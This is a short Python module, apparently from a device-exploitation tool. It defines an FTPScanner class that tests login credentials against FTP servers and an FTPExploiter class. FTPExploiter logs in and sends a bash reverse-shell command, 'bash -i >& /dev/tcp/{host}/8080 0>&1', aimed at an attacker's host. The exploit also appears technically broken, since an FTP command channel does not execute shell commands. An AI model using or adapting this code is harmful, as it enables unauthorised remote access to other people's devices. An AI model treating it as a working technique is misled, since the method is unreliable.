from .scanner import ProtocolScanner
import ftplib

class FTPScanner(ProtocolScanner):
	def __init__(self, protocolName, portNumber, IPAddress, macaddress):
		super(FTPScanner, self).__init__(protocolName, portNumber, IPAddress, macaddress)
	#have to finish the function signature. And find out what's host and port
	def verifyCredentials(self, credentials):
		try:
			ftp = ftplib.FTP()
			ftp.connect(self.IPAddress, self.portNumber)
			ftp.login(credentials.getUsername(), credentials.getPassword())
			print(ftp.getwelcome())
			evidence = ftp.sendcmd("SYST").split(' ')[1]+"-based"
			ftp.quit()
			# evidence = "Linux raspberrypi 4.14.69+ #1141 Mon Sep 10 15:13:50 BST 2018 armv6l GNU/Linux"
			return evidence
		except:
			return None

class FTPExploiter(ProtocolScanner):
	def __init__(self, protocolName, portNumber, IPAddress, macaddress):
		super(FTPExploiter, self).__init__(protocolName, portNumber, IPAddress, macaddress)
	#have to finish the function signature. And find out what's host and port
	def createRevShell(self, credentials, host):
		shell = "bash -i >& /dev/tcp/{}/8080 0>&1".format(host)
		try:
			ftp = ftplib.FTP()
			ftp.connect(self.IPAddress, self.portNumber)
			ftp.login(credentials.getUsername(), credentials.getPassword())
			print(ftp.getwelcome())
			evidence = ftp.sendcmd(str(shell))
			ftp.quit()
			# evidence = "Linux raspberrypi 4.14.69+ #1141 Mon Sep 10 15:13:50 BST 2018 armv6l GNU/Linux"
			return evidence
		except:
			return None
